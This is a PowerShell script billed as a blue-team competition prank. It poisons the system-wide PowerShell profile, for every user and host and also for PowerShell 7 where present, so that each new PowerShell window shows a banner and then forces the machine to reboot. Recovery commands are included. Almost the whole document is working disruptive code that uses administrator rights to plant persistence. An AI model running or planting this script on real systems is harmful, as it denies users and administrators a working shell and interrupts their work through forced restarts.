# /////////////////////////////////////////////////////////////\
# CCDC Blue Team -- PS PROFILE REKT
#
# PURPOSE: Blue-team training prank. Poisons the PowerShell
# AllUsersAllHosts profile so every PS window triggers an
# immediate forced reboot.
#
# RECOVERY (from cmd.exe or powershell -NoProfile):
#   powershell.exe -NoProfile
#   del "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
#   -- or --
#   Remove-Item "$env:windir\System32\WindowsPowerShell\v1.0\profile.ps1"
#
# SCOPE: AllUsersAllHosts profile -- every user, every PS host.
# /////////////////////////////////////////////////////////////\

#Requires -RunAsAdministrator

# AllUsersAllHosts profile path (PS 5.1 / Windows PowerShell)
$profilePath = "$env:windir\System32\WindowsPowerShell\v1.0\profile.ps1"

# PS 7+ AllUsersAllHosts path (only if PS 7 is installed)
$ps7ProfilePath = "$env:ProgramFiles\PowerShell\7\profile.ps1"

# The payload that gets written into the profile
$payload = @'
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor Red
Write-Host "  ||  YOU HAVE BEEN  F O O T  S H O T    ||" -ForegroundColor Red
Write-Host "  ||  PS profile poisoned. Rebooting...   ||" -ForegroundColor Red
Write-Host "  ||  Fix: powershell.exe -NoProfile      ||" -ForegroundColor Red
Write-Host "  ||  Then: del $PROFILE.AllUsersAllHosts  ||" -ForegroundColor Red
Write-Host "  ==========================================" -ForegroundColor Red
Write-Host ""
Start-Sleep -Seconds 3
Restart-Computer -Force
'@

function Poison-Profile { param([string]$Path)
    $dir = Split-Path $Path -Parent
    if (-not (Test-Path $dir)) {
        Write-Host "[!] Profile directory not found: $dir -- skipping" -ForegroundColor Yellow
        return
    }

    if (Test-Path $Path) {
        $existing = Get-Content $Path -Raw -ErrorAction SilentlyContinue
        if ($existing -match "Restart-Computer") {
            Write-Host "[*] Profile already poisoned: $Path" -ForegroundColor Cyan
            return
        }
        # Prepend payload -- runs before any existing content
        $newContent = $payload + "`r`n`r`n# --- original profile below ---`r`n" + $existing
        Set-Content -Path $Path -Value $newContent -Encoding UTF8 -Force
        Write-Host "[+] Prepended reboot payload to existing profile: $Path" -ForegroundColor Green
    } else {
        Set-Content -Path $Path -Value $payload -Encoding UTF8 -Force
        Write-Host "[+] Created poisoned profile: $Path" -ForegroundColor Green
    }
}

Write-Host ""
Write-Host " /////////////////////////////////////////////////////////////\" -ForegroundColor Yellow
Write-Host "   PS PROFILE REKT" -ForegroundColor Yellow
Write-Host "   Every PowerShell window now reboots the machine." -ForegroundColor DarkGray
Write-Host "   Recovery: powershell.exe -NoProfile, then delete profile." -ForegroundColor DarkGray
Write-Host " \/////////////////////////////////////////////////////////////" -ForegroundColor Yellow
Write-Host ""

Poison-Profile -Path $profilePath

if (Test-Path (Split-Path $ps7ProfilePath -Parent)) {
    Poison-Profile -Path $ps7ProfilePath
}

Write-Host ""
Write-Host "[+] Done. Next time anyone opens PowerShell: 3-second countdown, then forced reboot." -ForegroundColor Green
Write-Host "[!] To recover: run  powershell.exe -NoProfile  then delete the profile file(s) above." -ForegroundColor Yellow
Write-Host ""
